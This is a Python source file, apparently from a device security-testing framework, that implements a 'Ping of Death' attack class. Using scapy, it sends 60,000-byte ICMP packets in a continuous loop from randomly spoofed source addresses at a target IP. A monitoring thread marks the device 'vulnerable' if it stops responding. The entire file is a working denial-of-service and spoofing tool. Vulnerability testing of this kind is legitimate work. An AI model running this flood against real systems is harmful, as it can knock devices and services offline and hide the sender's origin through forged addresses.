
from generic_attack import *
import logging
log = logging.getLogger(__name__)
from scapy.all import *
import threading

class PingOfDeath(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(PingOfDeath, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']
        global continuousAttack
        continuousAttack = self.config['continuous_attack']

        tstatus = threading.Thread(target=self.deviceStatus, args=(result,))
        tstatus.start()
        rand_addr = self.address_spoofer()
        ip_hdr = IP(src=rand_addr, dst=target)
        packet = ip_hdr / ICMP() / ("m" * 60000)  # send 60k bytes of junk

        packetDataSize = len(packet)
        start_time = time.time()
        packetCount = 0
        while self.running:
            rand_addr = self.address_spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 60000)  # send 60k bytes of junk
            send(packet)
            packetCount = packetCount + 1

        tstatus.join()
        result.update({"directed_traffic(bytes/sec)": (packetCount * (packetDataSize + 40)) / (
            time.time() - start_time), "attack_time:": (time.time() - start_time)})
        return

    def deviceStatus(self, result):
        max = 5
        detected = 0
        while self.running:
            if not self.is_alive():
                detected = detected + 1
                time.sleep(0.1)
                if detected == max:
                    result.update({"status": "vulnerable"})
                    global continuousAttack
                    if not continuousAttack:
                        self.running = False
                    return
        result.update({"status": "not_vulnerable"})

    def address_spoofer(self):

        addr = [192, 168, 0, 1]
        d = '.'
        addr[0] = str(random.randrange(11, 197))
        addr[1] = str(random.randrange(0, 255))
        addr[2] = str(random.randrange(0, 255))
        addr[3] = str(random.randrange(2, 254))
        assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
        return assemebled

    def shutdown(self):
        self.running = False


